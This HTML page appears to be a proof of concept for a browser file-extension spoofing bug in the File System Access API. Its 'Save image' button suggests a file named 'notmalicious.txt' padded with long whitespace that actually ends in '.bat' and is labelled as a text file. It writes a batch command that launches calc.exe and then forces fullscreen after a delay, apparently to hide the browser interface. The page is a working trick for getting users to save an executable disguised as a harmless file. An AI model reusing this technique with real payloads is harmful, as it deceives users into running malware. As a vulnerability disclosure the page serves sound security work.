<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <title>File System Access API - Save then Fullscreen (3s delay)</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link rel="icon" type="image/x-icon" href="favicon.png">
  <style>
    body{font-family:system-ui,Arial;margin:24px}
    button{font-size:18px;padding:10px 14px;border-radius:8px;border:0;background:#2563eb;color:#fff;cursor:pointer}
    .status{margin-top:12px;color:#374151}
  </style>
</head>
<body>
  <h3>File System Access API - Hide extension by many white spaces</h3>
  <div style="display:flex;flex-direction:column;max-width:780px">
    <div>
      <button id="addNewFile" style="font-size:26px;margin-top:10px;">Save image</button>
    </div>
    <div id="status" class="status">Status: idle</div>
  </div>

  <script>
    const butSaveNewFile = document.getElementById('addNewFile');
    const statusEl = document.getElementById('status');

    function setStatus(t){ statusEl.textContent = 'Status: ' + t; }

    async function delay(ms){ return new Promise(r => setTimeout(r, ms)); }

    butSaveNewFile.addEventListener('click', async () => {
      butSaveNewFile.disabled = true;
      setStatus('Opening save file picker...');
      try {
        const options = {
          suggestedName: 'notmalicious.txt                                                                                                                                       .bat',
          types: [{
            description: 'Text file',
            accept: { 'text/plain': ['.bat'] },
          }],
        };

        // Show save file picker (user must interact and grant permission)
        const handle = await window.showSaveFilePicker(options);
        setStatus('Saving file...');
        const writable = await handle.createWritable();
        // Write content (example). Adjust as needed.
        await writable.write('C:\\Windows\\system32\\calc.exe');
        await writable.close();
        setStatus('File saved. Waiting 3 seconds before entering fullscreen...');

        // Delay 3 seconds
        await delay(3000);

        // Try to enter fullscreen
        try {
          if (document.documentElement.requestFullscreen) {
            await document.documentElement.requestFullscreen();
            setStatus('Entered fullscreen.');
          } else {
            setStatus('Fullscreen API not supported.');
          }
        } catch (fsErr) {
          console.error('Fullscreen error', fsErr);
          setStatus('Failed to enter fullscreen: ' + (fsErr && (fsErr.message || fsErr.name)));
        }

        // Optional: show an alert to indicate completion
        // alert('File saved and entered fullscreen (if supported).');

      } catch (err) {
        console.error('Error during save/fullscreen sequence', err);
        if (err.name === 'AbortError') setStatus('Save cancelled by user.');
        else if (err.name === 'NotAllowedError' || err.name === 'SecurityError') setStatus('Permission denied or insecure context (HTTPS required).');
        else setStatus('Error: ' + (err.message || err.name));
      } finally {
        butSaveNewFile.disabled = false;
      }
    });
  </script>
</body>
</html>


</html>
